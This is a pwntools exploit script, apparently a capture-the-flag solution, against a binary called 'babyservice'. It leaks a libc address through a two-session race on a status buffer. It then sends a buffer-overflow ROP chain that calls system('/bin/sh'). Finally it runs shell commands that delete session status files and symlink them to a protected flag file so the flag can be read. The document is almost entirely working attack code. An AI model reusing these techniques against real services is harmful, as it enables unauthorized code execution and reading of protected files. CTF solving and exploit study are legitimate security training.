#!/usr/bin/python3

from pwn import *
import time

exe = ELF('babyservice_patched', checksec=False)
libc = ELF('./libc.so.6', checksec=False)

context.binary = exe

info = lambda msg: log.info(msg)
sla = lambda con, msg, data: con.sendlineafter(msg, data)
sa = lambda con, msg, data: con.sendafter(msg, data)
sl = lambda con, data: con.sendline(data)

if args.REMOTE:
    p = remote('0', 1337)
    q = remote('0', 1337)
else:
    p = process(exe.path)
    q = process(exe.path)

cred = b'4321'
sla(p, b'> ', b'1')
sla(p, b'Username: ', cred)
sla(p, b'Password: ', cred)

sla(p, b'> ', b'2')
sla(p, b'Username: ', cred)
sla(p, b'Password: ', cred)

sla(q, b'> ', b'2')
sla(q, b'Username: ', cred)
sla(q, b'Password: ', cred)

##################################
### Stage 1: Leak libc address ###
##################################
time.sleep(0.5)
sla(p, b'> ', b'3')
sla(p, b'Size: ', b'9')
sa(p, b'Status: ', b'1'*0x39)

time.sleep(0.5)
sla(q, b'> ', b'3')
sla(q, b'Size: ', b'9')
sa(q, b'Status: ', b'1')

time.sleep(0.5)
sla(p, b'> ', b'4')
p.recvuntil(b'Status: ')
p.recv(8)
libc_leak = u64(p.recv(8))
libc.address = libc_leak - 0x6081f
info("Libc leak: " + hex(libc_leak))
info("Libc base: " + hex(libc.address))

#########################
### Stage 2: Overflow ###
#########################
pop_rdi = libc.address + 0x0000000000173373

time.sleep(0.5)
sla(q, b'> ', b'3')
sla(q, b'Size: ', b'99')
payload = flat(
    b'A'*280,
    pop_rdi + 1,
    pop_rdi, next(libc.search(b'/bin/sh')),
    libc.sym.system
    )
sa(q, b'Status: ', payload)

time.sleep(0.5)
sla(p, b'> ', b'4')
p.recvuntil(b'> [+] Status: ')

#########################
### Stage 3: Get flag ###
#########################
# Create symbolink to all session
sl(p, b'ls /tmp/session')
while True:
    session_name = p.recvline(timeout=1)[:-1]
    if not session_name:
        break
    sl(p, b'rm /tmp/session/' + session_name + b'/status')
    sl(p, b'ln -s /home/authservice/flag /tmp/session/' + session_name + b'/status')

# Get status
sla(q, b'> ', b'4')
print(q.recvuntil(b'Status: '))
print(q.recvline())
p.interactive()